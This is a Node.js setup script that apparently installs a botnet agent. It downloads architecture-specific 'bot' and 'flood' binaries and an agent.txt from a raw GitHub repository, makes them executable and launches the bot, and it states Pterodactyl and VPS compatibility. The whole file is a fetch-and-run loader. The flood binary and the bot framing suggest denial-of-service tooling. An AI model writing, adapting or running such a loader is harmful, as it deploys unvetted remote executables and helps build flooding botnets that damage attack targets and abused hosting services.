/**
 * Bot Setup Script - Pure Node.js (Pterodactyl & VPS Compatible)
 * Downloads fully-static bot + flood (musl, TLS-enabled) binaries for
 * the detected architecture and agent.txt, then launches the bot.
 */

const https = require('https');
const http  = require('http');
const os    = require('os');
const fs    = require('fs');
const path  = require('path');
const { spawn } = require('child_process');

const REPO_BASE = 'https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main';

const ARCH_MAP = {
    x64:   'x86_64',
    arm64: 'aarch64',
    arm:   'armv7l',
    ia32:  'x86',
};

const binArch = ARCH_MAP[os.arch()] || 'x86_64';

const FILES_TO_DOWNLOAD = [
    { url: `${REPO_BASE}/bots/bot-${binArch}`,   filename: 'bot',       executable: true },
    { url: `${REPO_BASE}/methods_cpp/flood-${binArch}`, filename: 'flood', executable: true  },
    { url: `${REPO_BASE}/agent.txt`,             filename: 'agent.txt', executable: false },
];

function download(url, destPath) {
    return new Promise((resolve, reject) => {
        const client = url.startsWith('https') ? https : http;

        client.get(url, (res) => {
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                return download(res.headers.location, destPath).then(resolve).catch(reject);
            }

            if (res.statusCode !== 200) {
                return reject(new Error(`HTTP ${res.statusCode} — ${url}`));
            }

            const fileStream = fs.createWriteStream(destPath);
            res.pipe(fileStream);
            fileStream.on('finish', () => fileStream.close(resolve));
            fileStream.on('error', (err) => { fs.unlink(destPath, () => {}); reject(err); });
        }).on('error', (err) => { fs.unlink(destPath, () => {}); reject(err); });
    });
}

async function setup() {
    const targetDir = process.cwd();
    console.log(`[+] Setting up Bot in: ${targetDir}`);
    console.log(`[+] Platform: ${os.platform()} arch: ${os.arch()} (using ${binArch} binaries)`);

    for (const item of FILES_TO_DOWNLOAD) {
        const dest = path.join(targetDir, item.filename);
        try {
            process.stdout.write(`[*] Downloading ${item.filename}... `);
            await download(`${item.url}?t=${Date.now()}`, dest);
            console.log('OK');
            if (item.executable) {
                fs.chmodSync(dest, 0o755);
                console.log(`[+] chmod +x ${item.filename}`);
            }
        } catch (err) {
            console.log('FAILED');
            console.error(`[!] ${item.filename}: ${err.message}`);
        }
    }

    const botBin = path.join(targetDir, 'bot');
    if (!fs.existsSync(botBin)) {
        console.error('[-] Bot binary not found, aborting.');
        process.exit(1);
    }

    console.log('[+] Launching bot...');
    const child = spawn(botBin, [], {
        cwd:   targetDir,
        stdio: ['inherit', 'pipe', 'pipe'],
    });

    child.stdout.on('data', (d) => process.stdout.write(d));
    child.stderr.on('data', (d) => process.stderr.write(d));
    child.on('error', (err) => { console.error(`[!] ${err.message}`); process.exit(1); });
    child.on('exit',  (code, sig) => {
        console.log(`[!] Bot exited: code=${code} signal=${sig}`);
        process.exit(code || 0);
    });

    process.on('SIGINT',  () => child.kill('SIGINT'));
    process.on('SIGTERM', () => child.kill('SIGTERM'));
}

setup().catch((err) => {
    console.error(`[!] Setup failed: ${err.message}`);
    process.exit(1);
});
